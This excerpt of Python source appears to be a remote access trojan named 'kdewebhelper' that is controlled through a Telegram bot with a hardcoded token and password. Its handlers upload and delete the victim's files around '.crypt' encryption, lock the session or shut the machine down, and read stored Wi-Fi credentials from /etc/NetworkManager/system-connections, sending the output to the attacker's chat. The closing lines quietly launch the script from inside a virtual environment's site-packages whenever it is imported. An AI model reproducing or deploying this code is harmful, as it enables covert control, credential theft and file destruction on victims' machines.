...
def kdewebhelper():
    TOKEN = '8016973210:AAG2a2iU-co_kG2eGHcFjjg-YvmmvIebwEE'  
    MASTER_PSSWD = 'softwarica'
    ...
    def handle_upload_command(message):
        try:
            # Extract the file path from the message text
                    ...
                    for file in files:
                        ...
                        if not file_path.endswith('.crypt'):
                            try:
                                ...
                                bot.send_message(message.chat.id, f"Error deleting file {file_path}: {str(delete_error)}")
    ...
    def lock_command(message):
        try:
            # For KDE Plasma on EndeavorOS
            result = subprocess.run(["loginctl", "lock-session"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    ...
    def shutdown_command(message):
        try:
            result = subprocess.run(["shutdown", "-h", "1"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            if result.returncode == 0:
                bot.send_message(message.chat.id, "Shutdown in 1 minute.")
            else:
    ...
    def text_to_speech_command(message):
        try:
            ...
            if text:
                ...
                engine.say(text)
                engine.runAndWait()
                bot.send_message(message.chat.id, "Speech successful.")
            else:
                bot.send_message(message.chat.id, "Use like this: /speech [TEXT]")
        except Exception as e:
            bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
    ...
    def get_wifi_passwords(message):
        try:
            # On Linux, check NetworkManager or iwd profiles
            result = subprocess.run(["sudo", "nmcli", "device", "wifi", "list"], 
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            if result.returncode == 0:
                output = result.stdout
                bot.send_message(message.chat.id, f"WiFi Networks:\n{output}")
            else:
                # Alternative: check stored connections
                result = subprocess.run(["sudo", "cat", "/etc/NetworkManager/system-connections/*"], 
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
                if result.returncode == 0:
                    bot.send_message(message.chat.id, f"Stored WiFi Config:\n{result.stdout}")
                else:
                    bot.send_message(message.chat.id, "Unable to retrieve WiFi information.")
        except Exception as e:
            bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
...
if not __name__ == '__main__':
    subprocess.Popen(['python3', '.venv/lib/python3.13/site-packages/kdewebhelper.py'])
